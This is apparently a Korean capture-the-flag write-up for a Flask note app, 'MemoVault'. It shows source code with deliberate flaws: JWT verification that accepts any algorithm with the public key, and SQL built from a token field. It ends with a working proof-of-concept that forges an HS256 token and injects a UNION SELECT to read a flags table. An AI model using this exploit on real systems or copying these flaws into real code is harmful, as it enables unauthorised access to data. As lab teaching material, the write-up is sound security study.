# MemoVault
<img width="1892" height="412" alt="image" src="https://github.com/user-attachments/assets/be48e0d9-77ff-47e4-b865-661e551b2e03" />

## 분석
```
# Warning: This is real web service. Hacking is strictly forbidden.
import base64
import os
from flask import Flask, redirect, render_template, jsonify, request, make_response, url_for, flash
import sqlite3, os, time, json
import jwt
from jwt import InvalidTokenError, ExpiredSignatureError
from config import DB_PATH, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

app = Flask(__name__)
app.secret_key = os.urandom(32)

def read_key(path):
    with open(path, "rb") as f:
        return f.read()

def get_db():
    return sqlite3.connect(DB_PATH)

def init():
    os.makedirs("keys", exist_ok=True)
    os.makedirs("static", exist_ok=True)

    priv = ed25519.Ed25519PrivateKey.generate()

    priv_pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    pub_ssh = priv.public_key().public_bytes(
        encoding=serialization.Encoding.OpenSSH,
        format=serialization.PublicFormat.OpenSSH,
    )

    with open("keys/ed25519_private.pem", "wb") as f:
        f.write(priv_pem)

    with open("static/ed25519_public.pub", "wb") as f:
        f.write(pub_ssh)

def _verify_and_decode_eddsa(token):
    if not token:
        raise InvalidTokenError("missing token")
    header_b64 = token.split('.')[0]
    padding = '=' * (-len(header_b64) % 4)
    header_bytes = base64.urlsafe_b64decode(header_b64 + padding)
    header = json.loads(header_bytes)
    alg = header.get("alg", "EdDSA")
    pubkey = read_key(PUBLIC_KEY_PATH)
    if isinstance(pubkey, bytes):
        pubkey = pubkey.decode("utf-8")
    return jwt.decode(token, key=pubkey, algorithms=jwt.algorithms.get_default_algorithms())

def _get_token_from_request():
    token = request.cookies.get("token")
    if not token:
        auth = request.headers.get("Authorization", "")
        if auth.lower().startswith("bearer "):
            token = auth.split(" ", 1)[1].strip()
    return token

def _verify_token(token):
    if not token:
        raise InvalidTokenError("missing token")
    pubkey = read_key(PUBLIC_KEY_PATH)
    if isinstance(pubkey, bytes):
        pubkey = pubkey.decode("utf-8")
    return jwt.decode(token, key=pubkey, algorithms=jwt.algorithms.get_default_algorithms())

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    # This service is live. Please refrain from real-world exploitation.
    if request.method == "GET":
        return render_template("login.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    conn = get_db()
    try:
        cur = conn.cursor()
        cur.execute("SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?", (username, password))
        row = cur.fetchone()
    finally:
        conn.close()

    if not row:
        return render_template("login.html", error="Invalid credentials")

    uid, uname, is_admin = row

    now = int(time.time())
    private_key = read_key(PRIVATE_KEY_PATH)
    if isinstance(private_key, bytes):
        private_key = private_key.decode("utf-8")

    payload = {
        "uid": str(uid),
        "uname": uname,
        "iat": now,
        "exp": now + 3600,
    }
    token = jwt.encode(payload, private_key, algorithm="EdDSA")
    resp = redirect(url_for("profile"))
    resp.set_cookie("token", token, httponly=False, samesite="Lax", secure=False)
    return resp

@app.route("/profile", methods=["GET", "POST"])
def profile():
    try:
        claims = _verify_and_decode_eddsa(_get_token_from_request())
        uid = claims.get("uid")
        uname = claims.get("uname")
    except:
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor()

    print(claims, uid, uname, flush=True)

    if request.method == "POST":
        action = request.form.get("action")
        if action == "create":
            content = request.form.get("content", "").strip()
            if content:
                cur.execute("INSERT INTO notes (owner_id, content) VALUES (?, ?)", (uid, content))
                conn.commit()
        elif action == "delete":
            note_id = request.form.get("note_id")
            try:
                nid = int(note_id)
                cur.execute("DELETE FROM notes WHERE id = ? AND owner_id = ?", (nid, uid))
                conn.commit()
            except Exception:
                pass
        conn.close()
        return redirect(url_for("profile"))

    cur.execute(f"SELECT id, content FROM notes WHERE owner_id = {uid} ORDER BY id DESC LIMIT 50")
    rows = cur.fetchall()
    conn.close()
    notes = [{"id": r[0], "content": r[1]} for r in rows]

    return render_template("profile.html", uname=uname, notes=notes)

@app.route("/logout", methods=["POST","GET"])
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("token")
    return resp

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    init()
    app.run(host="0.0.0.0", port=8000)
```
- app.py


```
-- Seed data for MemoVault (safe defaults; admin not meant to login)
INSERT INTO users (id, username, password, is_admin) VALUES
  (1, 'guest', 'guest', 0),
  (2, 'admin', 'THIS_IS_NOT_A_LOGIN_PASSWORD', 1);

INSERT INTO notes (id, owner_id, content) VALUES
  (1, 1, 'Welcome to MemoVault!'),
  (2, 1, 'Your notes will appear here.'),
  (3, 1, 'This is a training skeleton.'),
  (4, 1, 'Sections 3 and 4 are intentionally omitted.'),
  (5, 1, 'Complete them to turn this into a real CTF.');

INSERT INTO flags (id, value) VALUES
  (1, 'DH{**flag**}');

```
- db

- db를 확인해보면 2개의 유저가 있는것을 확인가능(guest,admin)
```
  (1, 'guest', 'guest', 0),
  (2, 'admin', 'THIS_IS_NOT_A_LOGIN_PASSWORD', 1);
```
- flag또한 db notes 테이블에 존재하는것을 알수있음 컬럼은(id[int], value[char])
```
INSERT INTO flags (id, value) VALUES
  (1, 'DH{**flag**}');
```

- login은 /login 엔드포인트에서 가능하며 해당 로그인폼 사용시 전송되는 쿼리는 bind되어 sqli가 불가한것을 확인
```
@app.route("/login", methods=["GET", "POST"])
def login():
    # This service is live. Please refrain from real-world exploitation.
    if request.method == "GET":
        return render_template("login.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    conn = get_db()
    try:
        cur = conn.cursor()
        cur.execute("SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?", (username, password))
        row = cur.fetchone()
```

- 유저 세션은 jwt 토큰으로 유지하며 알고리즘은 EdDSA를 사용하는것을 확인가능하고 페이로드 형식은 다음과 같음
```
    payload = {
        "uid": str(uid),
        "uname": uname,
        "iat": now,
        "exp": now + 3600,
    }
    token = jwt.encode(payload, private_key, algorithm="EdDSA")
```

- 로그인하여 /profile 엔드포인트 접근시 해당 토큰 페이로드에서 uid를 가져옴
```
@app.route("/profile", methods=["GET", "POST"])
def profile():
    try:
        claims = _verify_and_decode_eddsa(_get_token_from_request())
        uid = claims.get("uid")
        uname = claims.get("uname")
```

- 해당 uid는 메인페이지에서 memo글을 조회하기위한 컬럼 index값으로 사용되고 해당 query문을 확인시 uid를 사용자가 직접조작이 가능하여 sqli가 발생하는것을 확인
```
    cur.execute(f"SELECT id, content FROM notes WHERE owner_id = {uid} ORDER BY id DESC LIMIT 50")
```

- 또한 공개키 경로가 노출되어있어 접근시 공개키를 받을수있음
```
with open("static/ed25519_public.pub", "rb") as f:
    pubkey = f.read()
```

- 또한 토큰을 검증하는 코드를 살펴보면 검증키는 public키로 받는것을 확인할수있고 검증 알고리즘을 명시하지않아 모든 알고리즘에대해 검증한다.
```
def _verify_and_decode_eddsa(token):
    if not token:
        raise InvalidTokenError("missing token")
    header_b64 = token.split('.')[0]
    padding = '=' * (-len(header_b64) % 4)
    header_bytes = base64.urlsafe_b64decode(header_b64 + padding)
    header = json.loads(header_bytes)
    alg = header.get("alg", "EdDSA")
    pubkey = read_key(PUBLIC_KEY_PATH)
    if isinstance(pubkey, bytes):
        pubkey = pubkey.decode("utf-8")
    return jwt.decode(token, key=pubkey, algorithms=jwt.algorithms.get_default_algorithms())
```

## PoC
- 공개키를 받는다.
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOcQql7vz9IvxO+omBjPVopPqxLILZMngTngjF9mzSbG
```
- 알고리즘을 서명과 검증을 똑같은 키로하는 대칭키 타입 HS256으로 변경
```
header = {
    "alg": "HS256",
    "typ": "JWT"
}
```
- 기본적으로 생성되는 jwt페이로드 형식에서 uid를 db형식에 맞춰서 flag 조회
```
payload = {
    "uid": "1 UNION SELECT 1, value FROM flags --",
    "uname": "guest",
    "iat": 1763092930,
    "exp": 1763096530
}
```

- 전체 코드
```
import jwt

pub = """ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOcQql7vz9IvxO+omBjPVopPqxLILZMngTngjF9mzSbG"""

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "uid": "1 UNION SELECT 1, value FROM flags --",
    "uname": "guest",
    "iat": 1763092930,
    "exp": 1763096530
}

token = jwt.encode(payload, pub, algorithm="HS256")
print(token)
```
<img width="2331" height="135" alt="image" src="https://github.com/user-attachments/assets/6fccefba-3d72-434d-98ed-104ea624da00" />
<img width="2098" height="883" alt="image" src="https://github.com/user-attachments/assets/38869e8f-ad57-4205-8b7e-10d00de49dff" />

